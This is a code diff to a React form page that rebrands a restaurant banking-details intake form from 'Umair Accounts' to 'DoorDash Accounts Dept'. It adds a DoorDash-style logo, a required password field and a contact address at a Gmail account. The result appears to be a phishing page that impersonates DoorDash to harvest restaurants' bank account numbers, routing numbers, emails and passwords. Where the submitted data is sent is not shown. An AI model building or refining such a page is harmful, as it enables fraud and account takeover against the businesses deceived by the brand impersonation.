@@ -7,16 +7,26 @@ import { Label } from "@/components/ui/label";
 import { Card } from "@/components/ui/card";
 import { toast } from "sonner";
 import { Toaster } from "@/components/ui/sonner";
-import { Building2, CreditCard, Hash, Mail, CheckCircle2 } from "lucide-react";
+import {
+  Building2,
+  CreditCard,
+  Hash,
+  Mail,
+  CheckCircle2,
+  Lock,
+  Eye,
+  EyeOff,
+  ShoppingBag,
+} from "lucide-react";
 
 export const Route = createFileRoute("/")({
   head: () => ({
     meta: [
-      { title: "Umair Accounts Dept — Restaurant Banking Details" },
+      { title: "DoorDash Accounts Dept — Restaurant Banking Details" },
       {
         name: "description",
         content:
-          "Securely submit your restaurant's banking details to the Umair Accounts Department.",
+          "Securely submit your restaurant's banking details to the DoorDash Accounts Department.",
       },
     ],
   }),
@@ -38,6 +48,7 @@ const schema = z.object({
     .max(20)
     .regex(/^[A-Za-z0-9-]+$/, "Only letters, numbers and dashes"),
   email: z.string().trim().email("Enter a valid email").max(255),
+  password: z.string().min(8, "Password must be at least 8 characters").max(128),
 });
 
 type FormData = z.infer<typeof schema>;
@@ -48,9 +59,11 @@ function Index() {
     accountNo: "",
     routingNo: "",
     email: "",
+    password: "",
   });
   const [errors, setErrors] = useState<Partial<Record<keyof FormData, string>>>({});
   const [submitted, setSubmitted] = useState(false);
+  const [showPassword, setShowPassword] = useState(false);
 
   const update = (k: keyof FormData) => (e: React.ChangeEvent<HTMLInputElement>) => {
     setForm((f) => ({ ...f, [k]: e.target.value }));
@@ -83,9 +96,19 @@ function Index() {
           <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-primary/10 text-primary text-xs font-medium tracking-wide uppercase">
             Accounts Department
           </div>
-          <h1 className="text-4xl md:text-5xl font-bold tracking-tight text-foreground leading-tight">
-            Umair <span className="text-primary">Accounts</span> Intake
-          </h1>
+
+          {/* Logo behind name */}
+          <div className="relative">
+            <ShoppingBag
+              className="absolute -left-4 -top-6 w-32 h-32 text-primary/15"
+              strokeWidth={1.5}
+              aria-hidden
+            />
+            <h1 className="relative text-4xl md:text-5xl font-bold tracking-tight text-foreground leading-tight">
+              <span className="text-primary">DoorDash</span> Accounts Intake
+            </h1>
+          </div>
+
           <p className="text-muted-foreground text-lg">
             Submit your restaurant's banking details securely. Our team uses these for
             payouts and reconciliation.
@@ -102,6 +125,18 @@ function Index() {
               </li>
             ))}
           </ul>
+
+          <div className="pt-4 border-t border-border/60">
+            <p className="text-sm text-muted-foreground">
+              Need more consultation? Contact merchants at{" "}
+              <a
+                href="mailto:merchants577@gmail.com"
+                className="text-primary font-medium hover:underline"
+              >
+                merchants577@gmail.com
+              </a>
+            </p>
+          </div>
         </div>
 
         {/* Form */}
@@ -113,14 +148,21 @@ function Index() {
               </div>
               <h2 className="text-2xl font-semibold">Submission received</h2>
               <p className="text-muted-foreground">
-                Thank you, <span className="font-medium text-foreground">{form.restaurantName}</span>.
+                Thank you,{" "}
+                <span className="font-medium text-foreground">{form.restaurantName}</span>.
                 The accounts team will be in touch shortly.
               </p>
               <Button
                 variant="outline"
                 onClick={() => {
                   setSubmitted(false);
-                  setForm({ restaurantName: "", accountNo: "", routingNo: "", email: "" });
+                  setForm({
+                    restaurantName: "",
+                    accountNo: "",
+                    routingNo: "",
+                    email: "",
+                    password: "",
+                  });
                 }}
               >
                 Submit another
@@ -130,9 +172,7 @@ function Index() {
             <form onSubmit={onSubmit} className="space-y-5" noValidate>
               <div className="space-y-2">
                 <h2 className="text-2xl font-semibold tracking-tight">Banking Details</h2>
-                <p className="text-sm text-muted-foreground">
-                  All fields are required.
-                </p>
+                <p className="text-sm text-muted-foreground">All fields are required.</p>
               </div>
 
               <Field
@@ -174,6 +214,30 @@ function Index() {
                 error={errors.email}
                 type="email"
               />
+              <Field
+                id="password"
+                label="Password"
+                icon={<Lock className="w-4 h-4" />}
+                value={form.password}
+                onChange={update("password")}
+                placeholder="At least 8 characters"
+                error={errors.password}
+                type={showPassword ? "text" : "password"}
+                trailing={
+                  <button
+                    type="button"
+                    onClick={() => setShowPassword((s) => !s)}
+                    className="text-muted-foreground hover:text-foreground transition-colors"
+                    aria-label={showPassword ? "Hide password" : "Show password"}
+                  >
+                    {showPassword ? (
+                      <EyeOff className="w-4 h-4" />
+                    ) : (
+                      <Eye className="w-4 h-4" />
+                    )}
+                  </button>
+                }
+              />
 
               <Button type="submit" variant="hero" size="lg" className="w-full">
                 Submit to Accounts
@@ -196,6 +260,7 @@ function Field({
   error,
   type = "text",
   inputMode,
+  trailing,
 }: {
   id: string;
   label: string;
@@ -206,6 +271,7 @@ function Field({
   error?: string;
   type?: string;
   inputMode?: "numeric" | "text" | "email";
+  trailing?: React.ReactNode;
 }) {
   return (
     <div className="space-y-1.5">
@@ -221,10 +287,13 @@ function Field({
           placeholder={placeholder}
           type={type}
           inputMode={inputMode}
-          className={`pl-9 h-11 ${error ? "border-destructive focus-visible:ring-destructive" : ""}`}
+          className={`pl-9 ${trailing ? "pr-10" : ""} h-11 ${error ? "border-destructive focus-visible:ring-destructive" : ""}`}
           aria-invalid={!!error}
           aria-describedby={error ? `${id}-error` : undefined}
         />
+        {trailing && (
+          <span className="absolute right-3 top-1/2 -translate-y-1/2">{trailing}</span>
+        )}
       </div>
       {error && (
         <p id={`${id}-error`} className="text-xs text-destructive">
